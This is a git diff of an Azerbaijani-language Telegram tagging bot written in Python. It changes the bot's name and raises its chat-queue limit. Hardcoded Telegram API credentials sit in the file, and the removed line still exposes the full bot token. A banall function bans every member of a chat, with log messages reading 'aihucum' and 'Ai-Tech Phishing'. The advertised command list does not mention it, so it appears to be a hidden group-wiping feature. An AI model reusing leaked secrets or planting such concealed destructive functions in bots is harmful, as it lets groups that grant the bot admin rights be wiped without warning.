@@ -17,7 +17,7 @@ rzayev=Client(
     "AiTagBot",
     api_id = "18052289",
     api_hash = "552525f45a3066fee54ca7852235c19c",
-    bot_token = "7282238771:AAEU-YbJkkGjGS1cn4i_JNW9_CXPMzGYCNI"
+    bot_token = ""
 )
 
 chatQueue = []
@@ -30,7 +30,7 @@ stopProcess = False
 async def start_(client: rzayev, message: Message):
     await message.reply_sticker("CAACAgIAAyEFAASBBRPMAAIDn2aXhSnSNbDdNrXwoLqM9y9OynDhAAI8TgACtIG5SKYQcm8y6vOyHgQ")
     await message.reply_text(
-        f"""**Salam {message.from_user.mention} ⚕\nMən Marvel Tag Bot!\n
+        f"""**Salam {message.from_user.mention} ⚕\nMən Telegram Tağ Bot!\n
 ⎋  **Sizin yerinizə İstifadəçiləri spamsız Tağ edə bilərəm.**
 
 ⎋  **Əmrləri görmək üçünn “📚 Əmrlər“ butonuna basın.**
@@ -97,7 +97,7 @@ Mənimlə Şəxsidə əlaqə qurun.
 async def emrler(_, query: CallbackQuery):
     await query.edit_message_text(f"""<b>{query.from_user.mention} Haqqımda:\n🧸 Mən Spamsız Qrup və Kanallarda istidafəçiləri tağ etmə gücünə malikəm.\nBunlada bitmir, Qrup && Kanallarda Silinmiş Hesabları Qrup && Kanallardan ata bilirəm, Qrup && Kanallarda Botların Siyahısını Göstərirəm, Qrup && Kanallarda Adminlərin Siyahısını göstəriəm (tağ edirəm), İstifadəçinin ID'sini göstərə bilərəm, Qrupda İstifadəçiləri qarşılıya bilirəm, Çıxandada uzulə.. 😀\n\n
 📚 Əmrlər:\n
-» /marvel & marvel "səbəb": <i>Bütün üzvləri tağ edirəm.</i>\n
+» /ai & ai "səbəb": <i>Bütün üzvləri tağ edirəm.</i>\n
 » /sil & sil <i>Bütün silinmiş hesabları qrupdan atıram.</i>\n
 » /admins & admins <i>Bütün adminləri tağ edirəm.</i>\n
 » /bots & botlar: <i>Qrupda olan botları siyahısını göstərirəm.</i>\n
@@ -119,7 +119,7 @@ async def emrler(_, query: CallbackQuery):
 
 @rzayev.on_callback_query(filters.regex("gstart"))
 async def gstart(_, query: CallbackQuery):
-    await query.edit_message_text(f"""**Salam {message.from_user.mention} ⚕\nMən Marvel Tag Bot!\n
+    await query.edit_message_text(f"""**Salam {message.from_user.mention} ⚕\nMən Telegram Tag Bot!\n
 ⎋  **Sizin yerinizə İstifadəçiləri spamsız Tağ edə bilərəm.**
 
 ⎋  **Əmrləri görmək üçünn “📚 Əmrlər“ butonuna basın.**""",
@@ -155,7 +155,7 @@ async def gstart(_, query: CallbackQuery):
 
 
 
-@rzayev.on_message(filters.command(["marveltag","all", "tag", "marvel", "gelin", "gəl"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
+@rzayev.on_message(filters.command(["ai","all", "tag", "marvel", "gelin", "gəl"], prefixes=["/", "!", "%", ",", "", ".", "@", "#"]))
 async def everyone(client, message):
   global stopProcess
   try: 
@@ -165,8 +165,8 @@ async def everyone(client, message):
     except:
       has_permissions = message.sender_chat  
     if has_permissions:
-      if len(chatQueue) > 5:
-        await message.reply("⛔️ | Hazırda maksimum 5 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
+      if len(chatQueue) > 15:
+        await message.reply("⛔️ | Hazırda maksimum 15 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
       else:  
         if message.chat.id in chatQueue:
           await message.reply("🚫 | Bu çatda artıq davam edən proses var.  Yenisini başlamaq üçün zəhmət olmasa /stop əmrini işlədin.")
@@ -236,8 +236,8 @@ async def remove(client, message):
       if bot.status == ChatMemberStatus.MEMBER:
         await message.reply("🕹 Silinmiş hesabları qrupdan atmaq üçün mənə admin icazələri lazımdır.")  
       else:  
-        if len(chatQueue) > 5 :
-          await message.reply("⛔️ | Hazırda maksimum 5 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
+        if len(chatQueue) > 15 :
+          await message.reply("⛔️ | Hazırda maksimum 15 söhbətim üzərində işləyirəm.  Lütfən, tezliklə yenidən cəhd edin.")
         else:  
           if message.chat.id in chatQueue:
             await message.reply("🚫 | Bu çatda artıq davam edən proses var.  Yenisini başlamaq üçün zəhmət olmasa ilk olaraq /cancel əmrindənə istifadə et.")
@@ -484,7 +484,7 @@ async def get_uptime(client, message):
     uptime_sec = (current_time - START_TIME).total_seconds()
     uptime = await _human_time_duration(int(uptime_sec))
     await message.reply_text(
-        "**aiTag Bot Status:\n\n"
+        "**Bot Status:\n\n"
         f"•**uptime:** `{uptime}`\n"
         f"•**start time:** `{START_TIME_ISO}`"
     )
@@ -500,7 +500,7 @@ async def banall(client, message: Message):
     async for i in rzayev.get_chat_members(message.chat.id):
         try:
             await rzayev.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
-            print("Atıldı - {} | Tərəfdindən - {} aihucum🇦🇿".format(i.user.id, message.chat.id))
+            print("Atıldı - {} | - {} aihucum🇦🇿".format(i.user.id, message.chat.id))
         except Exception as e:
             print("Xəta {} tərəfindən {}".format(i.user.id, e))           
     print("🇦🇿 proses tamamlandı: Ai-Tech Phishing ⚕️")
@@ -729,5 +729,6 @@ async def chatinfo_handler(client: rzayev, message: Message):
 
 
 
-print("marveltagbot aktivdir!")  
+print("tagbot aktivdir!")  
+print("### ~ /// ⚕️ aiteknoloji /// ~ ###")
 rzayev.run() 
